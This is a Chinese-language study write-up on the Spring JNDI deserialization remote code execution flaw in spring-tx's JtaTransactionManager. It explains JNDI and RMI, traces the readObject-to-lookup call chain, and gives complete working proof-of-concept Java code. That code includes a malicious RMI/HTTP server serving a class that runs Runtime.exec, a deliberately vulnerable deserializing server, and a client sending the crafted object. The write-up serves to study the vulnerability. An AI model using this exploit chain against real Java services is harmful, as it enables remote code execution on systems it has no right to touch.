

# Spring JNDI 反序列化漏洞

> 国外的研究人员zero thoughts发现了一个Spring框架的反序列化远程代码执行漏洞。
>
> Spring框架是一款用途广泛影响深远的java开源框架，它由[Rod Johnson](https://baike.baidu.com/item/Rod Johnson)创建。它是为了解决企业应用开发的复杂性而创建的。SpringJNDI反序列化漏洞主要存在于`spring-tx`包中，该包中的`org.springframeworkl.transation.jta.JtaTransationManager`类存在JNDI反序列化的问题，可以加载恶意注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。

## 漏洞前提条件

1. CLASSPATH 中包含了 `spring-tx.jar，spring-commons.jar，javax.transaction-api.jar`

2. 存在外网访问权限，可以远程下载构造的恶意类

3. 存在反序列化接口如RMI, JMS, IIOP等。

   出现漏洞的关键jar包 `spring-tx.jar`，并不是spring最基本的包，默认并不使用，所以并不是所有使用了spring框架的应用都受影响，需要具体检查是否包含了`spring-tx.jar`包。

## JNDI

JNDI(Java Naming and Directory Interface) ：是一个应用程序设计的API，是SUN公司为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，使我们能够通过名称去查询数据源从而访问需要的对象。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。

## RMI

[Java RMI](http://zh.wikipedia.org/wiki/Java_RMI)：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。

我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。

 **RMI为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法**。这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。

下边通过一个样例来解释一下具体的运用：

```
//定义了一个Person类
import java.io.Serializable;  
import java.rmi.Remote;  

public class Person implements Remote,Serializable {  

	private static final long serialVersionUID = 1L;  
	private String name;  
	private String password;  

	public String getName() {  
    	return name;  
    }  
	public void setName(String name) {  
		this.name = name;  
    }  
    public String getPassword() {  
        return password;  
    }  
    public void setPassword(String password) {  
        this.password = password;  
    }  
    public String toString(){  
        return "name:"+name+" password:"+password;  
    }  
}  
```

```
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.spi.NamingManager;

public class Test {

	public static void initPerson() throws Exception{

        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
        //注册RMI服务并且绑定了3001端口
		LocateRegistry.createRegistry(3001);
		System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
		System.setProperty(Context.PROVIDER_URL, "rmi://localhost:3001");

        //初始化
        InitialContext ctx = new InitialContext();
 
        //实例化person对象
        Person p = new Person();
        p.setName("hello");
        p.setPassword("jndi");

        //person对象绑定到JNDI服务中，JNDI的名字叫做：person。
        ctx.bind("person", p);
        ctx.close();
    }

    public static void findPerson() throws Exception{

        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了
        InitialContext ctx = new InitialContext();

        //通过lookup查找person对象
        Person person = (Person) ctx.lookup("person");
        System.out.println(person.toString());
        ctx.close();
    }

    public static void main(String[] args) throws Exception {
        initPerson();//绑定到对应的JNDI服务中
        findPerson();//从服务中查找到对象
    }
}
```

![1558014266956](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558014266956.png)

## JNDI Naming Reference

java为了将object对象存储在Naming或者Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming和Directory服务下，比如（rmi，ldap等）。在使用Reference的时候，我们可以直接把对象写在构造方法中，当被调用的时候，对象的方法就会被触发。理解了JNDI和JNDI reference后，就可以理解JNDI注入产生的原因了。

## JNDI注入产生的原因

>  Applications should not perform JNDI lookups with untrusted data

1. `lookup`参数可控
2. `InitialContext`以及其子类的`lookup`方法允许动态协议转换
3. `lookup`查找的对象是`Reference`类型及其子类
4. 当远程调用类的时候默认会在RMI服务器中的`classpath`中查找，如果不存在就会去url地址去加载类。如果都加载不到类就会失败。

## lookup方法分析

我们跟进一下`lookup`的方法，看一下里边就执行了一个`getURLOrDefaultInitCtx()`

![1558058468822](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558058468822.png)

进一步跟进`getURLOrDefaultInitCtx()`，就是先执行`getDefaultInitCtx()`，如果没有找到就执行`getURLContext()`

![1558058650997](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558058650997.png)

![1558058723406](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558058723406.png)

说明了，即使将`Context.PROVIDER_URL`的参数初始化为 `rmi://127.0.0.1:1099/a` ，但是如果`lookup`的参数可以控制，就可以重写`url`地址，将`url`指向我们特定的服务器。

```
// Create the initial context
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL, "rmi://secure-server:1099");
Context ctx = new InitialContext(env);
// Look up in the local RMI registry
// 重写了lookup的参数，可以实现远程加载恶意的对象，实现远程代码执行
Object local_obj = ctx.lookup(<attacker controlled>);
```

### 通过JNDI注入导致远程代码执行方法

1. RMI通过JNDI reference远程调用object方法
2. CORBA IOR 远程获取实现类
3. LDAP 通过序列化对象，JNDI Referene，ldap地址

## JNDI 注入样例

### Server端

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.net.httpserver.HttpServer;

import javax.naming.Reference;
import java.net.InetSocketAddress;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

public class ServerTest {

    public static void main(String args[]) throws Exception {
		//创建了一个HTTP服务
        System.out.println("Starting HTTP server");
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0);
        httpServer.createContext("/",new HttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();
		//创建了一个RMI服务
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference object = new Reference("ExportObject", "ExportObject", "http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(object);
        //将类别绑定到RMI中
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/object'");
        registry.bind("object", refObjWrapper);
    }
}
```

```
import com.sun.net.httpserver.*;
import java.io.*;

public class HttpFileHandler implements HttpHandler {
    public void handle(HttpExchange httpExchange) {
        try {
            System.out.println("new http request from "+httpExchange.getRemoteAddress()+" "+httpExchange.getRequestURI());
            InputStream inputStream = HttpFileHandler.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while(inputStream.available()>0) {
                byteArrayOutputStream.write(inputStream.read());
            }

            byte[] bytes = byteArrayOutputStream.toByteArray();
            httpExchange.sendResponseHeaders(200, bytes.length);
            httpExchange.getResponseBody().write(bytes);
            httpExchange.close();
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

```
public class ExportObject {
    public ExportObject() {
        try {
            while(true) {
                System.out.println("running injected code...");
                Runtime.getRuntime().exec("calc.exe");
                Thread.sleep( 1000 );
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Client端

```
import javax.naming.Context;
import javax.naming.InitialContext;

public class ClientTest {

    public static void main(String[] args) throws Exception {
		//从绑定的目录中读取到类
        String uri = "rmi://127.0.0.1:1099/object";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
```

上述代码我们创建了一个HTTP服务之后，有创建了一个RMI服务，并且RMI提供了对`ExportObject`类的查询操作。`ExportObject`类的功能就是简单的弹出计算器。

先运行Server端，然后运行Client端，就可以实现复现。之前按照别人的做了好多遍都没有复现成功，原来是在同一个Java虚拟机中开启的Server端和Client端。。。放到两个项目里就没问题了。。。

其次要注意一下线程要sleep一下，不然的话会弹计算器弹的什么都干不了。。。。。日常感觉自己蠢哭系列

![1558080313043](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558080313043.png)



## Spring RCE

> Spring RCE形成的主要原因是Spring框架的`spring-tx-xxx.jar`中的`org.springframework.transaction.jta.JtaTransactionManager` 存在一个`readObject`方法。当执行对象反序列化的时候，会执行`lookup`操作，导致了JNDI注入，可以导致远程代码执行问题。

首先是看一下`org.springframework.transaction.jta.JtaTransactionManager`这个类里边的源码，发现有readObject的方法重写。

![1558081125247](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558081125247.png)

进一步跟进`initUserTransactionAndTransactionManager()`方法，主要功能为使用JNDI的方法，来查找`this.userTransactionName` 对应的事务，然后调用了`this.lookupUserTransaction(this.userTransactionName)` 。

![1558081153927](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558081153927.png)

进一步跟进，会发现调用了`this.getJndiTemplate().lookup()`方法，这个就是之前说到过的`lookup`方法，可以通过对这个方法的参数设计，来执行命令。

![1558081368924](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558081368924.png)

### 整体的调用链思路：

`JtaTransactionManager -> readObject ->`
`initUserTransactionAndTransactionManager ->`
`lookupUserTransaction ->`
`lookup`

**最终 `lookup `的参数`userTransactionName`是通过`this.userTransactionName`传入的，这个值我们可以在构建`JtaTransactionManager`类的时候来设置为任意值。**

### 利用流程

发送恶意payload ->
Server端接到payload，访问恶意的RMI服务 ->
RMI访问HTTP服务获取poc类，返回给Server端 ->
Server端反序列化拿到的poc类，并且执行构造函数

## Spring RCE POC

### Server端

```
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class ExploitableServer {
    public static void main(String[] args) {
        try {
            //本地监听1234端口
            ServerSocket serverSocket = new ServerSocket(1234);
            System.out.println("Server started on port "+serverSocket.getLocalPort());
            while(true) {
                Socket socket=serverSocket.accept();
                System.out.println("Connection received from "+socket.getInetAddress());
                ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
                try {
                    //执行接收到类的readObject方法
                    Object object = objectInputStream.readObject();
                    System.out.println("Read object "+object);
                } catch(Exception e) {
                    System.out.println("Exception caught while reading object");
                    e.printStackTrace();
                }
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Client端

```
import java.io.*;
import java.net.*;
import java.rmi.registry.*;

import com.sun.net.httpserver.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;

public class JDNI {

    public static void main(String[] args) {

        try {
            String serverAddress = "127.0.0.1";
            int port = Integer.parseInt( "1234" );
            String localAddress= "127.0.0.1";

            System.out.println("Starting HTTP server");
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0);
            httpServer.createContext("/",new HttpFileHandler());
            httpServer.setExecutor(null);
            httpServer.start();

            System.out.println("Creating RMI Registry");
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://"+serverAddress+":8000/");
            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
            registry.bind("Object", referenceWrapper);

            System.out.println("Connecting to server "+serverAddress+":"+port);
            Socket socket=new Socket(serverAddress,port);
            System.out.println("Connected to server");
            String jndiAddress = "rmi://"+localAddress+":1099/Object";

            org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
            object.setUserTransactionName(jndiAddress);

            System.out.println("Sending object to server...");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
            objectOutputStream.writeObject(object);
            objectOutputStream.flush();
            while(true) {
                Thread.sleep(1000);
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

`HttpFileHandle` 的代码和`ExportObject`的代码跟之前提过的没有更改过。

依旧是先执行Server端，然后执行Client端，就可以实现复现。同样注意要开启两个项目，然后注意一下文件目录问题就可以了。

![1558083355134](https://github.com/sunSUNQ/Java_learning/raw/master/Spring_JNDI_Unserialize/image/1558083355134.png)





## 参考链接：

[Java学习笔记Java RMI](https://www.cnblogs.com/xt0810/p/3640167.html)

[Jndi注入及Spring RCE漏洞分析](https://www.freebuf.com/vuls/115849.html)

[京东消防猿的Spring 框架的反序列化漏洞的分析与实践](https://blog.csdn.net/qq_41534566/article/details/79045176)

[poc - zerothoughts](https://github.com/zerothoughts/spring-jndi)

[Spring-tx.jar反序列化漏洞分析](http://ju.outofmemory.cn/entry/362959)

[Java反序列化漏洞的一些利用链分析](https://www.anquanke.com/post/id/173459#h2-8)
